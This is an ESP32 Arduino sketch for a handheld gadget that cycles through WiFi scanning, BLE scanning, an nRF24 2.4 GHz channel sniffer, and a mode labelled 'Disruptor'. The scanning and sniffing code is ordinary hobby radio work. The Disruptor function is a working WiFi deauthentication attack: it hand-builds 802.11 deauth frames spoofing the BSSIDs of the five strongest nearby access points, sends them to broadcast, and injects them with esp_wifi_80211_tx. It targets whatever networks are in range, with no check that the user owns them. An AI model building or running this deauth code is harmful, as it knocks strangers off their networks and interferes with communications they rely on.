#include <WiFi.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>
#include <SPI.h>
#include <RF24.h>
#include <Wire.h>
#include <LiquidCrystal_I2C.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// ===== Pin Definitions =====
#define BUTTON_PIN        0    // Mode switch button
#define NRF_CE_PIN        5    // nRF24 CE
#define NRF_CSN_PIN       15   // nRF24 CSN

// ===== Display Parameters =====
#define LCD_ADDR          0x27
#define LCD_COLS          20
#define LCD_ROWS          4
#define OLED_RESET        -1
#define SCREEN_WIDTH      128
#define SCREEN_HEIGHT     64

// ===== Globals =====
enum Mode { WIFI_SCAN = 0, BLE_SCAN, DISRUPTOR, RF_SNIFF, MODE_COUNT };
volatile Mode currentMode = WIFI_SCAN;

LiquidCrystal_I2C lcd(LCD_ADDR, LCD_COLS, LCD_ROWS);
Adafruit_SSD1306 oled(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
RF24 radio(NRF_CE_PIN, NRF_CSN_PIN);

// WiFi scan storage
struct APInfo { String ssid; uint8_t bssid[6]; int rssi; };
std::vector<APInfo> lastAPs;

// Button ISR: debounce and cycle modes
void IRAM_ATTR handleButton() {
  static uint32_t last = 0;
  uint32_t now = millis();
  if (now - last > 200) {
    currentMode = static_cast<Mode>((currentMode + 1) % MODE_COUNT);
    last = now;
  }
}

// ===== Function Prototypes =====
void handleWiFiScan();
void handleBLEScan();
void handleDisruptor();
void handleRFsniff();

void setup() {
  Serial.begin(115200);

  // Button
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  attachInterrupt(digitalPinToInterrupt(BUTTON_PIN), handleButton, FALLING);

  // LCD
  lcd.init();
  lcd.backlight();

  // OLED
  Wire.begin();
  oled.begin(SSD1306_SWITCHCAPVCC);
  oled.clearDisplay();
  oled.display();

  // WiFi
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(true);

  // BLE
  NimBLEDevice::init("ESP32");

  // nRF24
  radio.begin();
  radio.setAutoAck(false);
  radio.setDataRate(RF24_1MBPS);
  radio.setPALevel(RF24_PA_LOW);
  uint64_t wildcard = 0xFFFFFFFFFF;
  radio.openReadingPipe(0, wildcard);
}

void loop() {
  lcd.clear();
  lcd.setCursor(0, 0);
  switch (currentMode) {
    case WIFI_SCAN:
      lcd.print("Mode: WiFi Scan");
      handleWiFiScan();
      break;
    case BLE_SCAN:
      lcd.print("Mode: BLE Scan");
      handleBLEScan();
      break;
    case DISRUPTOR:
      lcd.print("Mode: Disruptor");
      handleDisruptor();
      break;
    case RF_SNIFF:
      lcd.print("Mode: RF Sniffer");
      handleRFsniff();
      break;
    default:
      break;
  }
  delay(500);
}

// -------- WiFi Scan & Monitor --------
void handleWiFiScan() {
  int n = WiFi.scanNetworks();
  lcd.setCursor(0, 1);
  lcd.printf("Found %d APs", n);

  // Store top 5 by RSSI
  lastAPs.clear();
  std::vector<APInfo> all;
  all.reserve(n);
  for (int i = 0; i < n; i++) {
    APInfo ap;
    ap.ssid = WiFi.SSID(i);
    WiFi.BSSID(i, ap.bssid);
    ap.rssi = WiFi.RSSI(i);
    all.push_back(ap);
  }
  std::sort(all.begin(), all.end(), [](auto &a, auto &b){ return a.rssi > b.rssi; });
  for (int i = 0; i < min(5, n); i++) lastAPs.push_back(all[i]);

  // OLED: bar graph of top 3
  oled.clearDisplay();
  for (int i = 0; i < min(3, (int)lastAPs.size()); i++) {
    int bar = map(lastAPs[i].rssi, -100, 0, 0, SCREEN_HEIGHT/2);
    oled.fillRect(i * 40 + 10, SCREEN_HEIGHT - bar - 1, 30, bar, SSD1306_WHITE);
  }
  oled.display();
}

// -------- BLE Scan & Monitor --------
void handleBLEScan() {
  NimBLEScan *pScan = NimBLEDevice::getScan();
  pScan->setActiveScan(true);
  auto results = pScan->start(5, false);
  int count = results.getCount();
  lcd.setCursor(0, 1);
  lcd.printf("Found %d BLE", count);

  // OLED similar bar graph by RSSI
  oled.clearDisplay();
  int x = 0;
  for (auto &adv : results) {
    int rssi = adv.getRSSI();
    int bar = map(rssi, -100, 0, 0, SCREEN_HEIGHT/2);
    oled.fillRect(x, SCREEN_HEIGHT - bar - 1, 10, bar, SSD1306_WHITE);
    x += 12;
    if (x > SCREEN_WIDTH - 10) break;
  }
  oled.display();
  pScan->clearResults();
}

// -------- Disruptor (WiFi Deauth) --------
void handleDisruptor() {
  if (lastAPs.empty()) {
    lcd.setCursor(0, 1);
    lcd.print("No AP data.");
    return;
  }
  // Send deauth to each saved AP
  for (auto &ap : lastAPs) {
    uint8_t deauth[26];
    deauth[0] = 0xC0; deauth[1] = 0x00;
    deauth[2] = 0; deauth[3] = 0;
    // addr1 = broadcast
    for (int i = 0; i < 6; i++) deauth[4 + i] = 0xFF;
    // addr2 & addr3 = AP BSSID
    for (int i = 0; i < 6; i++) {
      deauth[10 + i] = ap.bssid[i];
      deauth[16 + i] = ap.bssid[i];
    }
    deauth[22] = 0; deauth[23] = 0;        // seq ctrl
    deauth[24] = 0x07; deauth[25] = 0x00; // reason: class-3 frame
    esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
  }
  lcd.setCursor(0, 1);
  lcd.print("Deauth Sent");
}

// -------- RF Sniffer (nRF24) --------
void handleRFsniff() {
  uint32_t total = 0;
  oled.clearDisplay();
  for (uint8_t ch = 0; ch <= 125; ch++) {
    radio.stopListening();
    radio.setChannel(ch);
    radio.startListening();
    uint32_t count = 0;
    uint32_t t0 = millis();
    while (millis() - t0 < 50) {
      if (radio.available()) {
        uint8_t buf[32];
        uint8_t len = radio.getPayloadSize();
        radio.read(buf, len);
        count++;
      }
    }
    // draw bar
    int h = map(count, 0, 10, 0, SCREEN_HEIGHT/2);
    oled.fillRect(ch    / 10 * 12, SCREEN_HEIGHT - h - 1, 10, h, SSD1306_WHITE);
    total += count;
    radio.stopListening();
    if (ch % 10 == 9) {
      oled.display();
      delay(10);
    }
  }
  lcd.setCursor(0, 1);
  lcd.printf("PktTot: %u", total);
}
